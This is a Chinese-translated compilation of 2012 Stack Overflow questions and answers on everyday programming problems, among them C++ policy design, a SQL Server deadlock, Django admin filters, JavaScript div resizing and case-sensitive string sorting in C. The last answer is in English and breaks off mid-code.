tpal <- rgb(shift.BR, maxColorValue=255)
barplot(test,col = tpal) 
```

![在此处输入图像描述](../Images/37fd8419bf7f269aef7cab2bce51f788.png)

（但对于您的情况，这似乎是错误的方向。）

# c++ - 基于策略的设计中相互交互的策略

> ID：12646699
> 
> 赞同：0
> 
> 时间：2012-09-28T20:06:39.250
> 
> 标签：c++, genetic-algorithm, policy-based-design

我正在尝试为一个项目编写遗传算法，并且很难将不同的功能分开。我一直在阅读基于策略的设计，这似乎是解决问题的方法，但我并不真正了解如何实现它。

我有一个 OptimizerHost，它继承自一个 SelectionPolicy（用于确定评估哪些解决方案）和一个 FitnessPolicy（用于确定任何给定解决方案的适用性）。问题是我无法弄清楚这两种策略如何相互通信。算法的大部分是在 SelectionPolicy 中实现的，但它仍然需要能够检查其解决方案的适用性。我唯一能想到的就是在 OptimizerHost 本身中实现 ​​SelectionPolicy 算法，这样它就会从 FitnessPolicy 继承它需要的东西。但这似乎首先忽略了使用策略的意义。我是不是误会了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T22:15:34.257

我对基于策略的设计原则（抱歉）不是很熟悉，但是当我读到你的问题时，我觉得你需要像纯虚拟类（作为接口）这样的东西来帮助你解决它。

问题是，如果之前没有声明，你不能使用其他的东西：这是基本规则。因此，您需要使用和虚拟接口说 SelectPolicy，FitnessPolicy 有一些成员要使用。请按照示例进行操作，并根据您的算法需求进行相应更改。

首先：为 SelectionPolicy 和 FitnessPolicy 创建接口

```
template <class T> class FitnessPolicyBase
{
  public:

    virtual int Fitness(T fitnessSet); // assuming you have implemented the required classes etc. here - return value can be different of course

  ...
} // write your other FitnessPolicy stuff here

template <class T> class SelectionPolicyBase
{
  public:

   virtual T Selector(FitnessPolicyBase<Solution> evaluator, Set<T> selectionSet); // assuming such a set exists here

   ...  
} // write your other selectionpolicy interface here 
```

现在，由于我们使这些类成为纯虚拟的（它们只有虚函数），我们不能使用它们，只能从它们继承。这正是我们要做的：SelectionPolicy 类和 FitnessPolicy 类将分别从它们继承：

```
class SelectionPolicy: public SelectionPolicyBase<Solution> // say, our solutions are of Solution Type...
{
  public:
    virtual Solution Selector(FitnessPolicyBase<Solution> evaluator, Set<Solution> selectionSet);   // return your selected item in this function

  ...
}

class FitnessPolicy : public FitnessPolicy Base<Solution> // say, our solutions are of SolutionSet Type...
{
  public:
    virtual int Fitness(Solution set);   // return the fitness score here

  ...
} 
```

现在，我们的算法可以使用两种类型的参数运行：SolutionSetBase 和 FitnessSetBase。我们真的需要 xxxBase 类型吗？实际上并非如此，只要我们有 SolutionPolicy 和 FitnessPolicy 类的公共接口，我们就可以使用它们；但是使用这种方式，我们将“逻辑”与问题分开了。

现在，我们的选择策略算法可以引用策略类，然后调用所需的函数。请注意，策略类也可以调用彼此的类。所以现在这是一个有效的情况：

```
virtual Solution SelectionPolicy::Selector(FitnessPolicyBase<Solution> evaluator, Set<T> selectionSet)
{
  int score = evaluator.Fitness(selectionSet[0]); //assuming an array type indexing here. Change accordingly to your implementation and comparisons etc. 
} 
```

现在，为了让它工作，你必须初始化一个 FitnessPolicy 对象并将它传递给这个 Selector。由于向上转换和虚函数，它将正常工作。

如果我把事情复杂化了，请原谅我——我最近离 C++ 有点远（最近在 C# 上工作）因此可能把语法弄错了，但逻辑应该是一样的。

# iphone - 使用 Three20 和 iOS6 架构 armv7s 的未定义符号

> ID：12646700
> 
> 赞同：2
> 
> 时间：2012-09-28T20:06:42.900
> 
> 标签：iphone, objective-c, xcode, ios6, armv7

尝试为 iOS6 和 iPhone 5 更新我们的应用程序，我们（目前）仍然无法完全摆脱 Facebook Three20 库。

在 iPhone 和 iPad 的模拟器中调试时，一切正常。尝试在 iPhone 5 上调试时，出现以下故障：

```
 ld: warning: ignoring file ..../Build/Products/Debug-iphoneos/libThree20.a, file was built for archive which is not the architecture being linked (armv7s): ..../Build/Products/Debug-iphoneos/libThree20.a 
```

其次是：

```
Undefined symbols for architecture armv7s:
  "_OBJC_CLASS_$_TTTabItem", referenced from: 
```

有没有办法为我的目标重新链接/重建 Three20 库，以确保它为 armv7 正确构建并在 iPhone 5 上正常工作以进行调试？

我试过搞乱项目的构建设置等，但没有成功解决这个问题。

谢谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-28T20:19:23.373

摆弄了一个小时后，我意识到我需要进入我的项目，并为每个附加的 Three20 项目选择它，进入该项目的构建设置，然后手动将架构更新为新的所需 armv7、armv7s。

# sql-server-2005 - 删除和更新之间的死锁

> ID：12646702
> 
> 赞同：0
> 
> 时间：2012-09-28T20:07:08.187
> 
> 标签：sql-server-2005, deadlock, database-deadlocks

第一道工序：

```
<deadlock-list>
 <deadlock victim="process8d9798">
  <process-list>
   <process id="process8d9798" taskpriority="0" logused="0" waitresource="PAGE:
    5:1:190354" waittime="3203" ownerId="53807810" transactionname="DELETE" 
    lasttranstarted="11:29:29.153" XDES="0x3dbb518" lockMode="U" 
    schedulerid="2" kpid="1792" status="suspended" spid="57" sbid="0" ecid="1" 
    priority="0" transcount="0" lastbatchstarted="2012-09-28T11:29:29.120" 
    lastbatchcompleted="11:29:29.120" clientapp=".Net SqlClient Data Provider" 
    hostname="xxx" hostpid="4460" isolationlevel="read uncommitted (1)" 
    xactid="53807810" currentdb="5" lockTimeout="4294967295" clientoption1="671088672" 
    clientoption2="128056">
    <executionStack>
     <frame procname="Chooser2.dbo.DeleteUserSelections" line="15" stmtstart="360"
     stmtend="464" sqlhandle="0x030005008839117bf599a500099800000100000000000000">
   DELETE UserPlanOption
    WHERE UserID = @userId     </frame>
    </executionStack>
    <inputbuf>
    </inputbuf>
   </process> 
```

第二道工序：

```
 <process id="processb84988" taskpriority="0" logused="1744" waitresource="PAGE:
    5:1:190487" waittime="3203" ownerId="53807415" transactionname="user_transaction" 
   lasttranstarted="11:29:13.513" XDES="0x2fc4e6e0" lockMode="IU" 
   schedulerid="4" kpid="4628" status="suspended" spid="52" sbid="0" ecid="0" 
   priority="0" transcount="2" lastbatchstarted="11:29:13.513" 
   lastbatchcompleted="11:29:13.513" 
   clientapp=".Net SqlClient Data Provider" hostname="xxx" 
   hostpid="4460" loginname="chooserpd" isolationlevel="read uncommitted (1)" 
   xactid="53807415" currentdb="5" lockTimeout="4294967295" clientoption1="671088672" 
   clientoption2="128056">
    <executionStack>
     <frame procname="Eligibility" line="149" stmtstart="10566" 
   stmtend="11604" sqlhandle="0x03000500171b4f52c1a6e200ada000000100000000000000">
UPDATE  UserPlanOption 
    SET     RateID = r.ID
    FROM    [User] u WITH (NOLOCK)
        LEFT JOIN Rate r ON r.FamilyTierID = u.FamilyTierID 
    WHERE   UserPlanOption.PlanOptionID NOT IN (SELECT ppo.PlanOptionID FROM 
                    @PORACPlanOptions ppo) AND
        u.ID = @userID AND u.ID = UserPlanOption.UserID AND
        r.PlanOptionID = UserPlanOption.PlanOptionID AND
        r.Criterion1 = dbo.GetPlanOptionAreaID_36()
      </frame>
    </executionStack>
    <inputbuf>
Proc [Database Id = 5 Object Id = 1380915991]    </inputbuf>
   </process>
  </process-list> 
```

资源清单：

```
 <resource-list>
   <pagelock fileid="1" pageid="190354" dbid="5" objectname="UserPlanOption" 
   id="lock1e482d80" mode="IX" associatedObjectId="72057594060996608">
    <owner-list>
     <owner id="processb84988" mode="IX"/>
    </owner-list>
    <waiter-list>
     <waiter id="process8d9798" mode="U" requestType="wait"/>
    </waiter-list>
   </pagelock>
   <pagelock fileid="1" pageid="190487" dbid="5" objectname="UserPlanOption" 
   id="lock25b32a80" mode="U" associatedObjectId="72057594060996608">
    <owner-list>
     <owner id="process8d9798" mode="U"/>
    </owner-list>
    <waiter-list>
     <waiter id="processb84988" mode="IU" requestType="wait"/>
    </waiter-list>
   </pagelock>
  </resource-list>
 </deadlock>
</deadlock-list> 
```

表“UserPlanOption 有一个复合 PK（UserId 和 PlanOptionId）。为什么删除会导致页面锁定？有人可以帮我理解这是怎么回事吗？让我困惑的是，我认为死锁是由后续引起的来自同一个客户端的查询，但这是不可能的。这些必须是访问同一个网页的不同客户端。

实际上，我想我知道第一个问题的答案——删除范围需要页面锁定。但我怎样才能解决这个问题？

索引查询的结果：

```
name                type type_desc is_unique data_space_id ignore_dup_key 
------------------- ---- --------- --------- ------------- -------------- 
PK_UserPlanOption_1 1    CLUSTERED 1         1             0              

is_primary_key is_unique_constraint fill_factor is_padded is_disabled 
-------------- -------------------- ----------- --------- ----------- 
1              0                    0           0         0           

is_hypothetical allow_row_locks allow_page_locks
--------------- --------------- ----------------
0               1               1 
```

[更新](http://heeroz.com/update.sqlplan)和[删除](http://heeroz.com/delete.sqlplan)的执行计划。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-29T17:33:36.507

**答案已更新**

## 观察

此图基于 XML 死锁图： ![在此处输入图像描述](../Images/e9aa5d5bb7595680e46203946478007b.png)

它显示 spid52 在 pageid=190354（UserPlanOption 表）上具有 IX 锁，并且正在请求 pageid=190487 上的 IU 锁（来自同一个 UserPlanOption 表）。~~我认为 UserPlanOption 表是一个堆表，这意味着它没有聚集索引。此外，这意味着您的 PK 是非集群的。~~如果您将运行此查询：

```
SELECT i.*
FROM sys.indexes i
WHERE i.object_id = OBJECT_ID('UserPlanOption') 
```

您将从 UserPlanOption 表中获得包含所有索引的列表（您可以发布此列表吗？）。在这种情况下，因为 spid52 执行 UPDATE，所以两个锁（IU 和 IX）都在 UPDATE 执行计划中显示（从我的角度来看）一个可能的**表/索引扫描运算符。**

但是，spid57 在同一资源上已经有一个 U 锁 (pageid=190487)。同一个连接 (spid57) 在另一个页面 (pageid=190354) 上请求另一个 U 锁，但此资源（页面）已被 spid52 (IX) 锁定。

因为（参见[锁定兼容性矩阵](http://msdn.microsoft.com/en-us/library/ms186396%28v=sql.105%29.aspx)）：

[i] 现有的 IX 和请求的 U 锁或

[ii] 现有的 U 和请求的 IU 锁

不兼容你有一个*很好的*死锁。

DELETE 语句的缓存计划是 ![在此处输入图像描述](../Images/700d8dfc5b8eda9b39f43854d968a4a0.png)

笔记：

*   现在，聚集索引扫描（具有并行性）运算符强制 DBMS 扫描 UserPlanOption 表中的所有行，

*   估计的行数只有 5（估计删除的行数） abd 存在**Parallelism*运算符表明 UserPlanOption 表很大，

*   您可以看到来自 SQL Server 的索引建议。

UPDATE 语句的缓存计划是 ![在此处输入图像描述](../Images/2870ff06c8ea0c34ff8512259dac37aa.png)

该计划的主要问题是：Rate 表上的聚簇索引扫描，一个具有从`[N][VAR]CHAR`(?) 到的隐式转换的计算标量，以及在 User 表`INT`之前的过滤器。`JOIN`

## 解决方案

基于这些观察，解决方案应该是：

[ 1 ]~~在 UserPlanOption(UserID,PlanOptionID) 上创建索引 IN_UserPlanOption_UserID_PlanOptionID；~~

```
-- SQL Server's suggestion
CREATE INDEX IN_UserPlanOption_UserID
ON UserPlanOption(UserID)
INCLUDE(PlanOptionID); -- optional 
```

注意 1：在我的选项中，UserPlanOption 表 (DELETE) 上的聚集索引扫描是导致此死锁的主要原因。

注意 2：UserPlanOption 在`(PlanOptionID, UserID)`列上有一个聚集索引。此索引有助于 UPDATE 语句（请参阅 PK_UserPlanOption_1: 上的 Seek 运算符`WHERE ... AND u.ID = UserPlanOption.UserID AND r.PlanOptionID = UserPlanOption.PlanOptionID AND ...`），但不能帮助 DELETE 语句 ( `WHERE UserID=@UserID`)。

[ 2 ] 为了提高 UPDATE 语句的性能，您可以创建 sugested 索引：

```
-- SQL Server's suggestion
CREATE INDEX IN_Rate_FamilyTierID
ON dbo.Rate(FamilyTierID)
INCLUDE (PlanOptionID, Criterion1); 
```

[ 3 ] 要删除隐式转换，您可以重写 DELETE 语句：

```
DECLARE @Criterion1 Criterion1_datatype? 
SET @Criterion1 = dbo.GetPlanOptionAreaID_36()

UPDATE  UserPlanOption 
    SET     RateID = r.ID
    FROM    [User] u 
        LEFT JOIN Rate r ON r.FamilyTierID = u.FamilyTierID 
    WHERE   UserPlanOption.PlanOptionID NOT IN (SELECT ppo.PlanOptionID FROM 
                    @PORACPlanOptions ppo) AND
        u.ID = @userID AND u.ID = UserPlanOption.UserID AND
        r.PlanOptionID = UserPlanOption.PlanOptionID AND
        r.Criterion1 = @Criterion1 
```

原始源代码（UPDATE 语句）包含此过滤器`r.Criterion = dbo.GetPlanOptionAreaID_36(...)`。此时，**如果**对 Rate 表中的每一行都调用此函数，则计算机标量运算符可能是另一个性能问题。

这个函数是确定性函数吗？

```
SELECT  r.IS_DETERMINISTIC, r.*
FROM    INFORMATION_SCHEMA.ROUTINES r
WHERE   r.ROUTINE_NAME='GetPlanOptionAreaID_36' 
```

[4] 我的建议是不要使用`NOLOCK`提示和/或`SET TRANSACTION ISOLATION LEVEL READ UNCOMMITTED`。这个*解决方案*应该只是*最后一个解决方案*。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-29T00:08:40.837

我相信死锁的原因是由于 UserPlanOption 表的访问顺序不同，很可能是由于 FamilyTierId 列上存在索引。

[您可以在此处](http://sqlindian.com/2012/06/30/deadlocks-due-to-different-access-order/)和[此处](http://sqlindian.com/2012/06/29/deadlocks-due-to-different-access-paths/)阅读有关此类问题的更多信息

避免这种死锁情况的一种可能方法是在 UPdate 语句之前根据 UserID 列预先获取锁，如

SELECT @userId = UserId 从 UserPlanOption WITH(UPDLOCK) WHERE UserID = @userId

# c# - 将 linq 与 WMI 集合一起使用

> ID：12646715
> 
> 赞同：1
> 
> 时间：2012-09-28T20:08:08.047
> 
> 标签：c#, linq, garbage-collection, wmi

我对释放 IDisposable 对象有疑问。

```
using (ManagementObjectSearcher s = new ManagementObjectSearcher("SELECT * FROM Win32_Service"))
{
    using (ManagementObject item = s.Get().Cast<ManagementObject>().Last())
    {

    }
} 
```

我是否也应该将 s.Get() 中的集合投入使用？

```
using (ManagementObjectSearcher s = new ManagementObjectSearcher("SELECT * FROM Win32_Service"))
{
    using (ManagementObjectCollection items = s.Get())
    {
        using (ManagementObject item = items.Cast<ManagementObject>().Last())
        {

        }
    }
} 
```

linq 是否从我在本主题的第一个代码块中处理集合 (s.Get())？

```
s.Get().Cast<ManagementObject>().Last() 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T20:34:00.647

如果您查看[使用文档](http://msdn.microsoft.com/en-us/library/yh598w02%28v=vs.80%29.aspx)

> 在 using 语句中可以使用多个对象，但必须在 using 语句中声明它们

所以我希望这两组 using 块是等效的。但是，虽然 [ManagementObjectCollection](http://msdn.microsoft.com/en-us/library/system.management.managementobjectcollection.aspx)实现了 IDisposable [ManagementObject](http://msdn.microsoft.com/en-us/library/system.management.managementobject.aspx)并没有实现，但使用文档也告诉我们：

> 提供给 using 语句的对象必须实现 IDisposable 接口。该接口提供了 Dispose 方法，该方法应该释放对象的资源。

因此，由于 using 块无论如何都无法处理 ManagementObject 资源，因此您不需要 ManagementObject 在其自己的 using 块中，可以使用

```
using (ManagementObjectSearcher s = new ManagementObjectSearcher("SELECT * FROM Win32_Service"))
{
    using (ManagementObjectCollection items = s.Get())
    {
        ManagementObject item = items.Cast<ManagementObject>().Last();
        //do stuff
    }
} 
```

老实说，因为`items`并且`item`范围在 using 块内，您可能只需要

```
using (ManagementObjectSearcher s = new ManagementObjectSearcher("SELECT * FROM Win32_Service"))
    {
        ManagementObjectCollection items = s.Get()
        ManagementObject item = items.Cast<ManagementObject>().Last();
        //do stuff
    } 
```

这应该为 GarbageCollection 释放它们，因此虽然您不知道`items`在 using 块的末尾调用了它的 Dispose 方法，但它将在下一个集合中调用。

# ios - Xcode 4.5 - 应用程序因内存使用过多而崩溃，在 4.3 上运行良好

> ID：12646717
> 
> 赞同：0
> 
> 时间：2012-09-28T20:08:16.060
> 
> 标签：ios, xcode, memory, view, uiviewcontroller

我有一个使用以下代码从视图控制器转换到视图控制器的应用程序：

```
[self addChildViewController:self.aNewViewController];
    [self transitionFromViewController:self.currentViewController
                      toViewController:self.aNewViewController
                              duration:1.0
                               options:UIViewAnimationOptionTransitionFlipFromBottom
                            animations:nil
                            completion:^(BOOL finished) {
                                [self.aNewViewController didMoveToParentViewController:self];
                                [self.currentViewController removeFromParentViewController];
                                self.currentViewController=self.aNewViewController;
                            }]; 
```

当我在 iOS 5.0 设备上使用 Xcode 4.3 运行它时，它运行非常流畅并且使用了大约 30 - 50 mb。当我在任何设备上使用 Xcode 4.5 运行它时，每次我更改视图控制器时，应用程序都会从​​ 30 - 70 - 100 - 130 mb 跳跃而崩溃。每次我离开视图控制器时似乎都没有释放内存。我正在使用 ARC。

提前感谢您提供的任何帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T12:27:23.360

在此处涉及的每个视图控制器的 dealloc() 中添加一条日志消息，其中包含一些唯一的字符串，并查看是否有任何参与转换的 VC 被释放。一个或几个没有被释放显然是问题所在。要寻找的是保留周期 - 它们的 ivars/properties 采用委托或保留它的类似参数。例如 NSTimer 保留它消息的对象。

如果您能找到这一点，解决方案是在您的 VC 中编写一个新方法，通过确保修改这些对象以不保留其所有者（对于 NSTimer，使其无效然后为零）来准备发布。

您可以在转换完成块中发送此新消息。

# c++ - 在 C++ 中通过引用传递二维结构数组

> ID：12646720
> 
> 赞同：-1
> 
> 时间：2012-09-28T20:08:41.167
> 
> 标签：c++, arrays, function, reference, 2d

所以我对c++很陌生，我试图通过引用一个函数来传递一个结构类型的二维数组。据我所知，它们是通过引用自动传递的。这是我的代码。问题可能很明显，但我无法弄清楚。编译器一直说变量或字段“函数”声明为 void 并且 bArray 未在此范围内声明。

```
void function(balloons bArray[][5]);

int main()
{
    struct balloons
    {
           float totalWeight;
        float largestBalloon;
    };
      balloons balloonsArray[20][5];

    function(balloonsArray);
} 

void function(balloons bArray[][5])
{
    bArray[1][1].totalWeight = 1.0
    bArray[1][1].largestBalloon = 1.0
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T20:10:54.987

您正在定义您的`struct`inside `main`，您的代码的其他部分也需要使用它。将定义移到函数外：

```
struct balloons
{
       float totalWeight;
    float largestBalloon;
};

void function(balloons bArray[][5]);

int main()
{
    // ... 
```

而且您还没有终止函数中的两个语句，您需要在那里使用分号：

```
bArray[1][1].totalWeight = 1.0;
bArray[1][1].largestBalloon = 1.0; 
```

# scala - Scala for 循环 - 在下一个循环中按 2*i

> ID：12646721
> 
> 赞同：2
> 
> 时间：2012-09-28T20:08:49.277
> 
> 标签：scala

这可能是一个基本的 scala 问题，但无法弄清楚如何：

如何使用 Scala 来表达这个 java 循环：

```
for (int i=1;i<100000;i=2*i) 
```

我知道这是一种可能的方式：

```
 def loopByTwiceBefore(from:Int, to:Int)(f:Int=>Unit):Unit = {
    if (from<to){
        f(from)
        loopByTwiceBefore(from*2, to)(f);
    }
  } 
```

但是在 Scala 中有没有更规范的方法来做到这一点。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-28T20:12:14.497

您可以使用`iterate`来自`Iterator`（或来自其他类`Stream`，如`List`等）的函数：

```
Iterator.iterate(1)(_*2).takeWhile(_ < 100000) foreach {...} 
```

# php - 通过从下拉列表中选择值来更改 div 的大小

> ID：12646725
> 
> 赞同：0
> 
> 时间：2012-09-28T20:09:00.807
> 
> 标签：php, javascript, html

我有一个下拉菜单，其中有一个像素值，下面是一个带有一些数据的 div，该 div 有一些宽度和高度，但我需要做的是当我选择任何值时假设我选择 350px 然后是大小div 应该会自动进行相应的调整。我不知道该怎么做，请向我推荐任何链接，以便我可以从那里获得帮助。在过去的一小时里，我正在寻找它或谷歌上的任何帮助。

这是html

```
 <td>
                <select name="sizi_pixel" id="drp">
                    <option value="1">100 Pixels</option>
                    <option value="2">200 Pixels</option>
                    <option value="3">350 Pixels</option>
                    <option value="4">450 Pixels</option>
                    <option value="5">600 Pixels</option>
                </select>
               </td> 
```

这是我想自动调整大小的 div

```
 <div style=" border-width:3px;border-style:solid;border-color:#ff9900; height:400px; width:300px">

                    <input class="color" value="999">
                            <input class="color" value="999">
                            <input class="color" value="999">
               </div> 
```

任何帮助将不胜感激

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T20:11:09.713

给您的 div 一个 id 并为您的列表视图的更改事件添加一个事件侦听器。每次引发事件时，您都可以更改列表的大小

```
<script>
    $(function() {
        $("#drp").change(function() {
            $("#rect").width($(this).val() + "px");
        });
    });
</script> 
```

您必须在页面中包含 jquery 并修改列表的 val 以匹配宽度

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T20:16:15.033

如果您有其他问题可以随时提出，这是一个工作示例：

Jsfiddle 演示：http: [//jsfiddle.net/kPFry/](http://jsfiddle.net/kPFry/)

```
<html>
<head>

<style>
    input {

        position: relative;
        width: 90%;

    }
</style>

<script>

function chng_div(src_id,div_id){

    var src_obj = document.getElementById(src_id);
    var div2chg = document.getElementById(div_id);
    div2chg.style.width = src_obj.value+"px";

}

</script>

</head>
<body>

    <select name="sizi_pixel" id="drp" onchange="chng_div('drp','div_to_chng');">
        <option value="100">100 Pixels</option>
        <option value="200">200 Pixels</option>
        <option value="350">350 Pixels</option>
        <option value="450">450 Pixels</option>
        <option value="500">600 Pixels</option>
    </select>

    <div style="border-width:3px;border-style:solid;border-color:#ff9900; height:400px; width:300px" id="div_to_chng">

        <input class="color" value="999">
        <input class="color" value="999">
        <input class="color" value="999">

    </div>

</body>
</html> 
```

*   这只是一个例子，请不要长期使用内联 CSS 样式，否则会花费太多。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-28T20:32:30.483

这个javascript应该可以解决问题！

您需要将事件侦听器附加到您的选择输入，还需要更改选项以表示框中的值。并给你的 div 一个 id，我给它 id 'myDiv'。

你也可以在这里看到它工作：http: [//jsfiddle.net/6avqc/1/](http://jsfiddle.net/6avqc/1/)

```
document.getElementById('drp').addEventListener('change', changeSize);

function changeSize() {
    var myDiv = document.getElementById('myDiv');
    var selectbox = document.getElementById('drp');

    var index = selectbox.selectedIndex;
    var value = selectbox[index].value;

    myDiv.style.width = value + 'px';
}​ 
```

# android - 有哪些选项可用于确保 Android 上的 VPN 连接可用？

> ID：12646726
> 
> 赞同：3
> 
> 时间：2012-09-28T20:09:10.367
> 
> 标签：android, api, vpn

我的应用程序通过 VPN 在远程主机上执行操作。一切都很好：在一部新手机上，我手动创建了 VPN 并确保它正常工作，加载应用程序并运行它以执行远程操作并继续我的一天。我的应用程序还会通知我远程发生的事情，因此必须保持连接才能正常工作。目前，该应用程序检测到远程主机何时无法访问并发送通知以通知我连接丢失，以便我可以单击 Android 的 VPN 状态屏幕中的重新连接按钮。

我想要的是以编程方式“按下”该按钮。

我*不*希望使用代码添加新的 VPN 连接，甚至不希望使用代码启动它——我只想在断开连接时重新连接 VPN。为什么 Android 不支持自动重新连接，即使它只尝试几次就完全放弃，就像当前的实现一样。

该应用程序永远不会分发，它仅适用于我们的内部支持人员，所以只要它在目标设备上运行，我不担心向后兼容性或设备特定问题：Galaxy S III

目前，该应用程序为`intent`用户提供了一个连接快捷方式，以使用 SETTINGS 意图快速访问 VPN 屏幕：

```
public void openVPN(View view) {   
    startActivity(new Intent("android.net.vpn.SETTINGS"));
} 
```

虽然这适用于手动重新连接，但必须这样做仍然很烦人，并且需要多次点击才能完成。我到处搜索，似乎没有人有一个优雅的解决方案，而无需将手机植根并使用 3rd 方 VPN 客户端包而不是 Android 客户端。

我是在使用股票 API 时运气不佳，还是有一些秘密的 ninja API 可以满足我的需求，即使这意味着失去向后和向前的兼容性？

这是我对 Stack Overflow 的第一个问题！

# python - django.admin.SimpleListFilter.queryset - 返回列表？

> ID：12646730
> 
> 赞同：3
> 
> 时间：2012-09-28T20:09:29.820
> 
> 标签：python, django, django-admin, django-admin-filters

我想通过模型中的函数过滤查询集。

```
class CommentAdmin(admin.ModelAdmin):

    class PostedByGuestFilter(admin.SimpleListFilter):

        title = 'Posted by Guest'
        parameter_name = 'posted_by_guest'

        def lookups(self, request, model_admin):
            return (
                (True, 'Yes'),
                (False, 'No'),
            )

        def queryset(self, request, queryset):
            if self.value():
                return [comment for comment in queryset if comment.posted_by_guest()]
            elif not self.value():
                return [comment for comment in queryset if not comment.posted_by_guest()] 
```

不幸的是，这种实施导致`django.admin`告诉我我的数据库已损坏。我该如何解决这个问题？

![在此处输入图像描述](../Images/219936dedd209ad7f911d446f9150141.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-08-22T00:03:52.180

它不是最佳的（将导致额外的 SQL 查询），`comment.posted_by_guest()`如果可能的话，我会寻找将逻辑移动到 SQL 中的方法（如果您需要帮助，请显示该方法的主体），但这应该工作：

```
def queryset(self, request, queryset):
    expected_value = self.value()
    excludes = []
    for comment in queryset:
        if comment.posted_by_guest() != expected_value:
            excludes.append(comment.id)
    return queryset.exclude(pk__in=excludes) 
```

Django 管理过滤器 API 可以做一些改进！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-28T22:07:08.933

这里的问题是 Django 需要一个查询集，而您的代码提供了一个列表。您可以通过将理解包装在一组中来解决此问题：

```
 def queryset(self, request, queryset):
        if self.value():
            return set(comment for comment in queryset if comment.posted_by_guest())
        elif not self.value():
            return set(comment for comment in queryset if not comment.posted_by_guest()) 
```

# c - 如何按字母顺序对字符串数组进行排序（区分大小写，非标准排序规则）

> ID：12646734
> 
> 赞同：20
> 
> 时间：2012-09-28T20:09:42.973
> 
> 标签：c, sorting, case-sensitive, alphabetical

我需要 ac 语言代码来对一些字符串进行排序，它应该区分大小写，**对于大小写相同的字母，小写必须在前**。例如以下字符串的排序结果：

```
eggs
bacon
cheese
Milk
spinach
potatoes
milk
spaghetti 
```

应该：

```
bacon
cheese
eggs
milk
Milk
potatoes
spaghetti
spinach 
```

我写了一个代码，但我得到的结果是：

```
Milk
bacon
cheese
eggs
milk
potatoes
spaghetti
spinach 
```

我不知道如何改进这一点，我已经搜索了很多。谁能帮我解决这个问题？

```
#include <stdio.h>
#include <string.h>

int main(){
    char c;
    char name[20][10], temp[10];
    int count_name = 0;
    int name_index = 0;
    int i, j;

    while ((c = getchar()) != EOF){
        if (c == 10){
            name[count_name][name_index] = '\0';
            count_name++;
            name_index = 0;
        } else {
            name[count_name][name_index] = c;
            name_index++;
        }
    }

    for(i=0; i < count_name-1 ; i++){
        for(j=i+1; j< count_name; j++)
        {
            if(strcmp(name[i],name[j]) > 0)
            {
                strcpy(temp,name[i]);
                strcpy(name[i],name[j]);
                strcpy(name[j],temp);
            }
        }
    }

    for (i = 0; i < count_name; i++){
        printf("%s\n", name[i]);
    }
} 
```

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2014-08-23T12:42:58.747

# Keep alike words together...

For lists of words, it is often more useful to group the "same" words together (even though they differ in case). For example:

```
Keeping things together:          Simple "M after m":
------------------------          -------------------
mars                              mars
mars bar                          mars bar
Mars bar                          milk
milk                              milk-duds
Milk                              milky-way
milk-duds                         Mars bar
milky-way                         Milk
Milky-way                         Milky-way 
```

If you want words arranged like the first column, I present three ways of doing so:

*   Using `strcasecmp()` combined with `strcmp()`.
*   A single pass implementation tracking the character type with `isalpha()`, `tolower()`, and `isupper()`.
*   A single pass implementation that utilizes a collating table.

In the end I discuss two alternatives:

*   Using the collating table to establish an arbitrary ordering.
*   Setting the locale to use locale based collating.

# Using available library functions

If it is possible to do so, avoid reinventing the wheel. In this case, we can do so by using the POSIX function `strcasecmp()` to see if they are equal with a case-insensitive comparison, and falling back on `strcmp()` when they are.

```
int alphaBetize (const char *a, const char *b) {
    int r = strcasecmp(a, b);
    if (r) return r;
    /* if equal ignoring case, use opposite of strcmp() result to get
     * lower before upper */
    return -strcmp(a, b); /* aka: return strcmp(b, a); */
} 
```

(On some systems, the case-insensitive comparison function is called `stricmp()` or `_stricmp()`. If one is not available to you, an implementation is provided below.)

```
#ifdef I_DONT_HAVE_STRCASECMP
int strcasecmp (const char *a, const char *b) {
    while (*a && *b) {
        if (tolower(*a) != tolower(*b)) {
            break;
        }
        ++a;
        ++b;
    }
    return tolower(*a) - tolower(*b);
}
#endif 
```

# Avoiding two passes over the strings

Sometimes, existing functions do not perform well enough, and you have to do something else to make things faster. The following function does the comparison in roughly the same way in a single pass, and without using either `strcasecmp()` or `strcmp()`. But, it treats all non-alphabetical characters as being less than letters.

```
int alphaBetize (const char *a, const char *b) {
    int weight = 0;
    do {
        if (*a != *b) {
            if (!(isalpha(*a) && isalpha(*b))) {
                if (isalpha(*a) || isalpha(*b)) {
                    return isalpha(*a) - isalpha(*b);
                }
                return *a - *b;
            }
            if (tolower(*a) != tolower(*b)) {
                return tolower(*a) - tolower(*b);
            }
            /* treat as equal, but mark the weight if not set */
            if (weight == 0) {
                weight = isupper(*a) - isupper(*b);
            }
        }
        ++a;
        ++b;
    } while (*a && *b);
    /* if the words compared equal, use the weight as tie breaker */
    if (*a == *b) {
        return weight;
    }
    return !*b - !*a;
} 
```

Using this comparison for sorting will keep `milk` and `Milk` next to each other even if the list includes `milk-duds`.

# Using a collating table

Here is a way to dynamically create a collating table from a "configuration". It serves to illustrate a contrastive technique to change how strings get compared.

You can map how the letters of the alphabet are compared with a kind of simple table that describes the relative order you want letters (or any character except the NUL byte) to have:

```
const char * alphaBetical =
    "aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ"; 
```

From this ordering, we can create a look-up table to see how two letters are supposed to compare to each other. The following function initializes the table if it has not already been done first, and otherwise performs the table look-up.

```
int alphaBeta_lookup (int c) {
    static int initialized;
    static char table[CHAR_MAX+1];
    if (!initialized) {
        /* leave all non-alphaBeticals in their relative order, but below
           alphaBeticals */
        int i, j;
        for (i = j = 1; i < CHAR_MAX+1; ++i) {
            if (strchr(alphaBetical, i)) continue;
            table[i] = j++;
